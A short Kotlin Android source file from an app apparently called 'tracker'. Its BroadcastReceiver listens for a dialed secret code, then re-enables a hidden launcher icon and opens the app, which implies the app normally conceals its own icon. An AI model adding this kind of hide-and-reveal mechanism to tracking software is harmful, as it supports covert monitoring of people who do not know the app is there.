package com.abuzahra.tracker.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log
import com.abuzahra.tracker.MainActivity

class SecretCodeReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SECRET_CODE") {
            Log.d("SecretCode", "Secret Code Received! Unhiding app...")
            
            // 1. إعادة تفعيل الأيقونة
            val pkg = context.packageManager
            val compName = android.content.ComponentName(context, "com.abuzahra.tracker.LauncherAlias")
            pkg.setComponentEnabledSetting(
                compName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            
            // 2. فتح التطبيق
            val launchIntent = Intent(context, MainActivity::class.java)
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(launchIntent)
        }
    }
}
